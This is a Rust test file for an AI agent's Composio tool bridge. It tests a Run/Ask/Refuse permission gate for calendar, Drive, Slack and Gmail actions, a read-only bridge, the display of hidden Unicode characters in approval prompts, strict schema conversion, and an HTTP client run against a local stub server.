    pairs.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
}

#[test]
fn test_composio_checks_each_calls_actual_arguments_and_takes_the_strictest() {
    let routine = ("GOOGLECALENDAR_CREATE_EVENT", json!({"summary": "Focus"}));
    let invite = ("GOOGLECALENDAR_CREATE_EVENT", json!({"attendees": ["reader@example.org"]}));
    assert_eq!(multi_args(std::slice::from_ref(&routine), None), Action::Run);
    assert_eq!(multi_args(&[routine.clone(), invite], None), Action::Ask); // same slug, different arguments
    assert_eq!(multi_args(&[("GOOGLECALENDAR_UPDATE_EVENT", json!({"event_id": "event", "send_updates": "none"}))], None), Action::Run);
    assert_eq!(multi_args(&[("GOOGLECALENDAR_UPDATE_EVENT", json!({"event_id": "event"}))], None), Action::Ask);
    assert_eq!(multi_args(&[("GOOGLEDRIVE_UPLOAD_FILE", json!({"file_to_upload": "notes.txt"}))], None), Action::Run);
    assert_eq!(
        multi_args(&[("GOOGLEDRIVE_UPLOAD_FILE", json!({"file_to_upload": "notes.txt", "folder_id": "shared"}))], None),
        Action::Ask
    );
    assert_eq!(multi_args(&[("GOOGLEDOCS_CREATE_DOCUMENT", json!({"title": "Private draft"}))], None), Action::Run);
    assert_eq!(
        multi_args(&[("SLACK_SEND_MESSAGE", json!({"channel": "channel", "text": "Hello"}))], Some(&pol(&[("slack", "write")]))),
        Action::Ask
    );
    assert_eq!(multi_args(&[("GMAIL_CREATE_DRAFT", json!({"body": "Unsent"}))], None), Action::Refuse); // explicit work-mail restriction
    assert_eq!(multi_args(std::slice::from_ref(&routine), Some(&pol(&[("googlecalendar", "ask")]))), Action::Ask);
    assert_eq!(multi_args(&[routine], Some(&pol(&[("googlecalendar", "read")]))), Action::Refuse);
}

#[test]
fn test_uninspectable_composio_batches_do_not_run() {
    for tools in [Value::Null, json!("opaque"), json!([{}]), json!([null]), json!([{"tool_slug": ""}])] {
        assert_eq!(d(MULTI_EXECUTE, &json!({"tools": tools})).action, Action::Ask, "{tools}");
    }
    assert_eq!(d(MULTI_EXECUTE, &Value::Null).action, Action::Ask);
}

#[test]
fn test_workbench_writes_need_review_when_their_arguments_are_not_known() {
    let code = "run_composio_tool('GOOGLEDRIVE_UPLOAD_FILE', arguments)";
    assert_eq!(d(WORKBENCH, &json!({"code_to_execute": code})).action, Action::Ask);
    assert_eq!(d(WORKBENCH, &json!({"code_to_execute": "print(sum([1,2]))"})).action, Action::Run);
}

// ---- test_updates_composio.py (the bridge's reads) ----------------------------------------------------------

#[test]
fn test_every_allowed_slug_only_reads() {
    for slug in ["SLACK_SEARCH_MESSAGES", "NOTION_SEARCH_NOTION_PAGE", "LINEAR_LIST_LINEAR_ISSUES", "GMAIL_FETCH_EMAILS",
                 "GOOGLECALENDAR_EVENTS_LIST"] {
        assert!(is_read_only(slug), "{slug}");
        assert!(consequential_slugs(MULTI_EXECUTE, &json!({"tools": [{"tool_slug": slug}]})).is_empty());
    }
}

#[tokio::test]
async fn test_the_bridge_refuses_a_writing_slug_itself() {
    let client = Arc::new(FakeClient::new());
    let bridge = ComposioBridge::new(ComposioConfig::new(true, "telegram-1"), factory(&client));
    bridge.inner.lock().client = Some(client.clone());
    assert_eq!(bridge.read_tool("SLACK_SEND_MESSAGE", &Map::new(), "ca_1").await["ok"], false);
    assert_eq!(bridge.read_tool("GITHUB_LIST_REPOSITORIES", &Map::new(), "ca_1").await["ok"], false); // a direct app
    assert_eq!(bridge.read_tool("SLACK_SEARCH_MESSAGES", &Map::new(), "").await["ok"], false); // no account
    assert!(client.calls.lock().tool_runs.is_empty());
    let got = bridge.read_tool("SLACK_SEARCH_MESSAGES", &obj(json!({"query": "from:me"})), "ca_1").await;
    assert_eq!(got["ok"], true);
    assert_eq!(
        client.calls.lock().tool_runs,
        vec![("SLACK_SEARCH_MESSAGES".to_string(), obj(json!({"query": "from:me"})), "telegram-1".to_string(), "ca_1".to_string())]
    );
    assert_eq!(
        Value::Object(bridge.read_tool("SLACK_SEND_MESSAGE", &Map::new(), "ca_1").await),
        json!({"ok": false, "reason": "SLACK_SEND_MESSAGE is not a read"})
    );
    assert_eq!(
        Value::Object(bridge.read_tool(" GITHUB_LIST_REPOSITORIES ", &Map::new(), "ca_1").await),
        json!({"ok": false, "reason": "GITHUB_LIST_REPOSITORIES needs one of the owner's Composio accounts"})
    );
    // not started at all
    let idle = ComposioBridge::new(ComposioConfig::new(true, "telegram-1"), None);
    assert!(!idle.can_read());
    assert_eq!(
        Value::Object(idle.read_tool("SLACK_SEARCH_MESSAGES", &Map::new(), "ca_1").await),
        json!({"ok": false, "reason": "composio is not started"})
    );
    assert_eq!(idle.connected_accounts().await.unwrap_err().to_string(), "composio is not started");
}

#[tokio::test]
async fn test_connected_accounts_leaves_direct_apps_out() {
    let bridge = bridge_for(vec![
        json!({"toolkit": {"slug": "SLACK"}, "id": "ca_1", "alias": null, "status": "ACTIVE"}),
        json!({"toolkit": {"slug": "googledrive"}, "id": "ca_2", "alias": null, "status": "ACTIVE"}),
        json!({"toolkit": {"slug": "gmail"}, "id": "ca_3", "alias": "work", "status": "EXPIRED"}),
        json!({"toolkit": "notion", "id": "", "status": "ACTIVE"}),
    ]);
    let got: Vec<Value> = bridge.connected_accounts().await.unwrap().iter().map(ConnectedAccount::to_value).collect();
    assert_eq!(
        got,
        vec![
            json!({"toolkit": "slack", "id": "ca_1", "alias": "", "status": "ACTIVE"}),
            json!({"toolkit": "gmail", "id": "ca_3", "alias": "work", "status": "EXPIRED"}),
        ]
    );
}

// ---- test_tool_gate.py: hidden and bidi characters are shown, never invisible ---------------------------------

#[test]
fn test_a_gate_question_shows_every_hidden_character() {
    let hidden = [
        "\u{200b}", "\u{200c}", "\u{200d}", "\u{200e}", "\u{200f}", "\u{202a}", "\u{202b}", "\u{202c}", "\u{202d}",
        "\u{202e}", "\u{2066}", "\u{2067}", "\u{2068}", "\u{2069}", "\u{feff}", "\u{061c}", "\u{e0041}", "\u{e007f}",
        "\u{00ad}", "\u{180e}", "\u{3164}", "\u{fe0f}", "\u{e0100}",
    ];
    for ch in hidden {
        let shown = format!("[U+{:04X}]", ch.chars().next().unwrap() as u32);
        let line = describe_whole(
            MULTI_EXECUTE,
            &json!({"tools": [{"tool_slug": "SLACK_SEND_MESSAGE", "arguments": {"channel": format!("gen{ch}eral"), "text": "hi"}}]}),
            500,
        )
        .unwrap();
        assert!(!line.contains(ch) && line.contains(&shown), "{shown}");
    }
}

// ---- test_suite_isolation.py --------------------------------------------------------------------------------

#[test]
fn test_the_state_path_follows_the_setting() {
    let tmp = tempfile::tempdir().unwrap();
    let state = tmp.path().join("isolated.json");
    let c = configured(Some(&env(&[("EVE_COMPOSIO_STATE", state.to_str().unwrap())])), &owners(&[1]));
    assert_eq!(c.state_path, state);
    assert_ne!(c.state_path, eve_apps_mcp::py::expanduser(Path::new(DEFAULT_STATE_PATH)));
}

// ---- the client's shapes: strict schemas, descriptions, errors -----------------------------------------------

#[test]
fn test_enhance_schema_descriptions_adds_type_hints_and_required_notes() {
    let mut schema = obj(json!({"type": "object", "properties": {
        "query": {"type": "string", "description": "What to find."},
        "limit": {"type": "integer"},
        "tags": {"type": "array", "description": "Tags"},
        "flag": true,
    }, "required": ["query", "tags"]}));
    client::enhance_schema_descriptions(&mut schema);
    assert_eq!(
        schema["properties"]["query"]["description"],
        "What to find. Please provide a value of type string. This parameter is required."
    );
    assert_eq!(schema["properties"]["limit"]["description"], "Please provide a value of type integer.");
    assert_eq!(schema["properties"]["tags"]["description"], "Tags. This parameter is required.");
    assert_eq!(schema["properties"]["flag"], true);
    // a string "required" is Python's substring test
    let mut text = obj(json!({"properties": {"ab": {}, "c": {}}, "required": "xaby"}));
    client::enhance_schema_descriptions(&mut text);
    assert_eq!(text["properties"]["ab"]["description"], "This parameter is required.");
    assert_eq!(text["properties"]["c"], json!({}));
    let mut bare = obj(json!({"type": "object"}));
    client::enhance_schema_descriptions(&mut bare);
    assert_eq!(Value::Object(bare), json!({"type": "object"}));
}

#[test]
fn test_strict_schema_makes_every_property_required_and_nullable() {
    let schema = json!({"type": "object", "properties": {
        "a": {"type": "string", "default": "x"},
        "b": {"type": "integer"},
        "c": {"oneOf": [{"type": "string"}, {"type": "integer"}], "description": "either"},
        "d": {"enum": ["x", null]},
        "e": {"type": "object", "properties": {"f": {"type": "boolean"}}, "required": ["f"]},
        "g": {"description": "free", "minimum": 1},
    }, "required": ["b", "b"]});
    let r = strict_schema::to_strict_json_schema(&schema).unwrap();
    assert!(r.unsupported.is_empty(), "{:?}", r.unsupported);
    assert_eq!(
        r.schema,
        json!({"type": "object", "properties": {
            "a": {"type": ["string", "null"]},
            "b": {"type": "integer"},
            "c": {"description": "either", "anyOf": [{"type": "string"}, {"type": "integer"}, {"type": "null"}]},
            "d": {"enum": ["x", null]},
            "e": {"type": ["object", "null"], "properties": {"f": {"type": "boolean"}}, "required": ["f"],
                  "additionalProperties": false},
            "g": {"description": "free", "anyOf": [{"minimum": 1}, {"type": "null"}]},
        }, "required": ["a", "b", "c", "d", "e", "g"], "additionalProperties": false})
    );
    assert_eq!(r.source, schema);
    assert!(r.total_changes >= 6);
}

#[test]
fn test_strict_schema_reports_what_it_cannot_express() {
    let free = strict_schema::to_strict_json_schema(&json!({"type": "object", "properties": {}, "additionalProperties": true}))
        .unwrap();
    assert_eq!(free.unsupported[0].keyword, "additionalProperties");
    let bare = strict_schema::to_strict_json_schema(&json!({"type": "object"})).unwrap();
    assert_eq!(bare.unsupported[0].keyword, "properties");
    let refs = strict_schema::to_strict_json_schema(&json!({"type": "object", "properties": {
        "x": {"$ref": "#/$defs/X"}, "y": {"$ref": "#/$defs/Missing"}}, "$defs": {"X": {"type": "string"}}}))
    .unwrap();
    assert_eq!(refs.unsupported.len(), 1);
    assert_eq!(refs.unsupported[0].keyword, "$ref");
    assert_eq!(refs.schema["properties"]["x"], json!({"anyOf": [{"$ref": "#/$defs/X"}, {"type": "null"}]}));
    let not_obj = strict_schema::to_strict_json_schema(&json!([1])).unwrap();
    assert!(not_obj.unsupported.iter().any(|u| u.keyword == "properties" || u.keyword == "type"));
    let all_of = strict_schema::to_strict_json_schema(&json!({"type": "object", "properties": {"a": {"allOf": []}}}))
        .unwrap();
    assert_eq!(all_of.unsupported[0].keyword, "allOf");
    assert_eq!(all_of.unsupported[0].path, "properties.a");
}

/// The SDK's own to_strict_json_schema over Composio-shaped schemas and edge cases (make_strict_schemas.py).
#[test]
fn test_strict_schema_matches_the_sdk() {
    let rows: Vec<Value> = serde_json::from_str(include_str!("../tests/fixtures/strict_schemas.json")).unwrap();
    assert!(rows.len() >= 30);
    let mut failures = Vec::new();
    for row in &rows {
        let r = strict_schema::to_strict_json_schema(&row["input"]).unwrap();
        let got = json!({
            "input": row["input"],
            "schema": r.schema,
            "source": r.source,
            "total_changes": r.total_changes,
            "changes": r.changes.iter().map(|c| json!([c.path, c.reason, c.detail])).collect::<Vec<_>>(),
            "unsupported": r.unsupported.iter().map(|u| json!([u.path, u.keyword, u.detail])).collect::<Vec<_>>(),
        });
        // key order too: the schema is sent as JSON text
        if serde_json::to_string(&got).unwrap() != serde_json::to_string(row).unwrap() {
            failures.push(format!("{}\n  got    {got}\n  python {row}", row["input"]));
        }
    }
    assert!(failures.is_empty(), "{}", failures.join("\n"));
}

#[test]
fn test_a_wrapped_tool_is_a_strict_responses_function() {
    let tool = obj(json!({"slug": "COMPOSIO_SEARCH_TOOLS", "description": "Search.", "input_parameters":
        {"type": "object", "properties": {"q": {"type": "string"}}, "required": ["q"]}}));
    assert_eq!(
        client::wrap_tool(&tool).unwrap(),
        json!({"type": "function", "name": "COMPOSIO_SEARCH_TOOLS", "description": "Search.", "parameters":
            {"type": "object", "properties": {"q": {"type": "string",
             "description": "Please provide a value of type string. This parameter is required."}},
             "required": ["q"], "additionalProperties": false}, "strict": true})
    );
    // a schema strict mode cannot carry is sent as it is, not strict
    let loose = obj(json!({"slug": "X", "description": "d", "input_parameters": {"type": "object", "properties": {},
                                                                                  "additionalProperties": true}}));
    let w = client::wrap_tool(&loose).unwrap();
    assert_eq!(w["strict"], false);
    assert_eq!(w["parameters"], json!({"type": "object", "properties": {}, "additionalProperties": true}));
    assert_eq!(client::wrap_tool(&obj(json!({"slug": "X"}))).unwrap_err().type_name(), "TypeError");
}

#[test]
fn test_status_errors_read_as_the_sdk_raises_them() {
    let e = client::status_error(404, "{\"error\": {\"message\": \"Session not found\", \"code\": 4}}");
    assert_eq!(e.type_name(), "NotFoundError");
    assert_eq!(e.message, "Error code: 404 - {'error': {'message': 'Session not found', 'code': 4}}");
    assert_eq!(client::status_error(502, " bad gateway ").message, "bad gateway");
    assert_eq!(client::status_error(418, "").type_name(), "APIStatusError");
    assert_eq!(client::status_error(418, "").message, "Error code: 418");
    assert_eq!(client::status_error(429, "{}").type_name(), "RateLimitError");
}

#[test]
fn test_clip_and_flat_read_as_python() {
    assert_eq!(clip("  a\n\tb  ", 60), "a b");
    assert_eq!(clip("abcdef", 4), "abc…");
    assert_eq!(clip("ab  cdef", 4), "ab…");
    assert_eq!(flat(&json!(null)), "null");
    assert_eq!(flat(&json!(1.5)), "1.5");
    assert_eq!(flat(&json!({"a": ["é", 2]})), "{\"a\": [\"é\", 2]}");
    assert_eq!(py_int(" 1_0 "), Some(10));
    assert_eq!(py_int("1__0"), None);
    assert_eq!(py_int("-3"), Some(-3));
    assert_eq!(py_int("x"), None);
}

#[test]
fn test_the_api_key_is_required_by_the_http_client() {
    let err = HttpComposioClient::new("", None, 60, &[]).err().unwrap();
    assert_eq!(err.type_name(), "ApiKeyNotProvidedError");
    assert!(err.message.contains("COMPOSIO_API_KEY"));
}

// ---- the HTTP client against a local server -----------------------------------------------------------------

struct Seen {
    method: String,
    target: String,
    headers: Vec<(String, String)>,
    body: Value,
}

/// A one-connection-at-a-time HTTP/1.1 server answering each request with the next canned (status, body).
async fn serve(answers: Vec<(u16, Value)>) -> (String, Arc<Mutex<Vec<Seen>>>) {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let seen: Arc<Mutex<Vec<Seen>>> = Arc::new(Mutex::new(Vec::new()));
    let log = seen.clone();
    tokio::spawn(async move {
        let mut answers = answers.into_iter();
        loop {
            let Ok((mut sock, _)) = listener.accept().await else { return };
            let mut buf: Vec<u8> = Vec::new();
            let mut tmp = [0u8; 4096];
            let (head_end, len) = loop {
                let n = sock.read(&mut tmp).await.unwrap_or(0);
                if n == 0 {
                    return;
                }
                buf.extend_from_slice(&tmp[..n]);
                if let Some(pos) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                    let head = String::from_utf8_lossy(&buf[..pos]).to_string();
                    let len = head
                        .lines()
                        .find_map(|l| l.to_lowercase().strip_prefix("content-length:").map(|v| v.trim().parse::<usize>().unwrap()))
                        .unwrap_or(0);
                    break (pos + 4, len);
                }
            };
            while buf.len() < head_end + len {
                let n = sock.read(&mut tmp).await.unwrap_or(0);
                if n == 0 {
                    break;
                }
                buf.extend_from_slice(&tmp[..n]);
            }
            let head = String::from_utf8_lossy(&buf[..head_end - 4]).to_string();
            let mut lines = head.lines();
            let request_line: Vec<String> = lines.next().unwrap().split(' ').map(String::from).collect();
            let headers = lines
                .filter_map(|l| l.split_once(':').map(|(k, v)| (k.trim().to_lowercase(), v.trim().to_string())))
                .collect();
            let body = serde_json::from_slice(&buf[head_end..head_end + len]).unwrap_or(Value::Null);
            log.lock().push(Seen { method: request_line[0].clone(), target: request_line[1].clone(), headers, body });
            let (status, answer) = answers.next().unwrap_or((500, json!({"error": "no more answers"})));
            let text = answer.to_string();
            let resp = format!(
                "HTTP/1.1 {status} X\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{text}",
                text.len()
            );
            let _ = sock.write_all(resp.as_bytes()).await;
            let _ = sock.shutdown().await;
        }
    });
    (format!("http://{addr}"), seen)
}

fn header<'a>(s: &'a Seen, name: &str) -> Option<&'a str> {
    s.headers.iter().find(|(k, _)| k == name).map(|(_, v)| v.as_str())
}

#[tokio::test]
async fn test_the_http_client_speaks_composios_api() {
    let (base, seen) = serve(vec![
        (200, json!({"session_id": "trs_1", "config": {}})),
        (200, json!({"items": [{"slug": "COMPOSIO_SEARCH_TOOLS", "description": "Search.",
                                "input_parameters": {"type": "object", "properties": {"q": {"type": "string"}}, "required": ["q"]}}],
                     "next_cursor": "c2"})),
        (200, json!({"items": [{"slug": "COMPOSIO_MULTI_EXECUTE_TOOL", "description": "Run.",
                                "input_parameters": {"type": "object", "properties": {}, "additionalProperties": false}}],
                     "next_cursor": null})),
        (200, json!({"data": {"hits": 1}, "log_id": "log_9", "extra": true})),
        (200, json!({"items": [{"toolkit": {"slug": "slack"}, "status": "ACTIVE", "id": "ca_1", "alias": null}]})),
        (200, json!({"data": {"messages": []}, "error": null, "successful": true, "log_id": "l", "session_info": {}})),
        (200, json!({"session_id": "trs_1"})),
    ])
    .await;
    let environ = vec![("COMPOSIO_TOOLKIT_VERSION_SLACK".to_string(), "20250906_01".to_string())];
    let client = HttpComposioClient::new("ak_live", Some(&base), 30, &environ).unwrap();
    let session = client
        .create_session("telegram-7", &json!({"enable": ["slack"]}), Some(&json!({"enable": true, "require_explicit_selection": true})))
        .await
        .unwrap();
    assert_eq!(session.session_id(), "trs_1");
    let tools = session.tools().await.unwrap();
    assert_eq!(tools.len(), 2);
    assert_eq!(tools[0]["name"], "COMPOSIO_SEARCH_TOOLS");
    assert_eq!(tools[0]["strict"], true);
    assert_eq!(tools[1]["parameters"], json!({"type": "object", "properties": {}, "additionalProperties": false, "required": []}));
    let out = session.execute("COMPOSIO_SEARCH_TOOLS", &obj(json!({"queries": []}))).await.unwrap();
    // model_dump order: the declared fields first, a missing optional one as None, then the rest
    assert_eq!(out, json!({"data": {"hits": 1}, "error": null, "log_id": "log_9", "extra": true}));
    assert_eq!(serde_json::to_string(&out).unwrap(), r#"{"data":{"hits":1},"error":null,"log_id":"log_9","extra":true}"#);
    let items = client.list_connected_accounts(&["telegram-7".to_string()]).await.unwrap();
    assert_eq!(items[0]["id"], "ca_1");
    let ran = client.execute_tool("SLACK_SEARCH_MESSAGES", &obj(json!({"query": "x"})), "telegram-7", "ca_1").await.unwrap();
    assert_eq!(ran, json!({"data": {"messages": []}, "error": null, "successful": true}));
    let used = client.use_session("trs_1").await.unwrap();
    assert_eq!(used.session_id(), "trs_1");

    let seen = seen.lock();
    assert_eq!(seen.len(), 7);
    assert_eq!((seen[0].method.as_str(), seen[0].target.as_str()), ("POST", "/api/v3.1/tool_router/session"));
    assert_eq!(
        seen[0].body,
        json!({"user_id": "telegram-7", "manage_connections": {"enable": true}, "toolkits": {"enable": ["slack"]},
               "multi_account": {"enable": true, "require_explicit_selection": true}})
    );
    assert_eq!(header(&seen[0], "x-api-key"), Some("ak_live"));
    assert_eq!(header(&seen[0], "x-framework"), Some("openai_responses"));
    assert_eq!(header(&seen[0], "x-request-id").map(str::len), Some(32));
    assert_eq!(seen[1].target, "/api/v3.1/tool_router/session/trs_1/tools?limit=500");
    assert_eq!(seen[2].target, "/api/v3.1/tool_router/session/trs_1/tools?cursor=c2&limit=500");
    assert_eq!(seen[3].target, "/api/v3.1/tool_router/session/trs_1/execute");
    assert_eq!(seen[3].body, json!({"tool_slug": "COMPOSIO_SEARCH_TOOLS", "arguments": {"queries": []}}));
    assert_eq!((seen[4].method.as_str(), seen[4].target.as_str()), ("GET", "/api/v3.1/connected_accounts?user_ids=telegram-7"));
    assert_eq!(seen[5].target, "/api/v3.1/tools/execute/SLACK_SEARCH_MESSAGES");
    assert_eq!(
        seen[5].body,
        json!({"arguments": {"query": "x"}, "connected_account_id": "ca_1", "user_id": "telegram-7", "version": "20250906_01"})
    );
    assert_eq!((seen[6].method.as_str(), seen[6].target.as_str()), ("GET", "/api/v3.1/tool_router/session/trs_1"));
}

#[tokio::test]
async fn test_the_http_client_retries_a_server_error_and_reports_a_client_error() {
    let (base, seen) = serve(vec![
        (503, json!({"error": "busy"})),
        (200, json!({"items": []})),
        (404, json!({"error": {"message": "Session not found"}})),
        (500, json!({"error": "boom"})),
    ])
    .await;
    let client = HttpComposioClient::new("k", Some(&base), 30, &[]).unwrap();
    assert!(client.list_connected_accounts(&["u".to_string()]).await.unwrap().is_empty()); // retried once
    let err = client.use_session("gone").await.err().unwrap();
    assert_eq!(err.type_name(), "NotFoundError");
    assert_eq!(err.message, "Error code: 404 - {'error': {'message': 'Session not found'}}");
    // a direct tool run is never retried: a read timeout must not run it twice
    let err = client.execute_tool("SLACK_SEARCH_MESSAGES", &Map::new(), "u", "ca").await.unwrap_err();
    assert_eq!(err.type_name(), "InternalServerError");
    assert_eq!(seen.lock().len(), 4);
}

#[tokio::test]
async fn test_the_bridge_runs_end_to_end_over_http() {
    let tmp = tempfile::tempdir().unwrap();
    let (base, seen) = serve(vec![
        (200, json!({"items": [{"toolkit": {"slug": "slack"}, "status": "ACTIVE", "id": "ca_1", "alias": "work"}]})),
        (200, json!({"session_id": "trs_http"})),
        (200, json!({"items": [{"slug": "COMPOSIO_SEARCH_TOOLS", "description": "S", "input_parameters": {"type": "object", "properties": {}}}]})),
        (400, json!({"error": "bad"})),
    ])
    .await;
    let b2 = base.clone();
    let make: ClientFactory =
        Arc::new(move || Ok(Arc::new(HttpComposioClient::new("k", Some(&b2), 30, &[])?) as Arc<dyn ComposioClient>));
    let config = ComposioConfig { state_path: tmp.path().join("s.json"), ..ComposioConfig::new(true, "telegram-7") };
    let bridge = ComposioBridge::new(config, Some(make));
    bridge.start().await.unwrap();
    assert_eq!(bridge.session_id(), "trs_http");
    assert_eq!(bridge.names().into_iter().collect::<Vec<_>>(), vec!["COMPOSIO_SEARCH_TOOLS"]);
    let out = bridge.execute("COMPOSIO_SEARCH_TOOLS", &Map::new()).await;
    assert_eq!(Value::Object(out), json!({"ok": false, "reason": "BadRequestError: Error code: 400 - {'error': 'bad'}"}));
    assert_eq!(seen.lock().len(), 4);
}
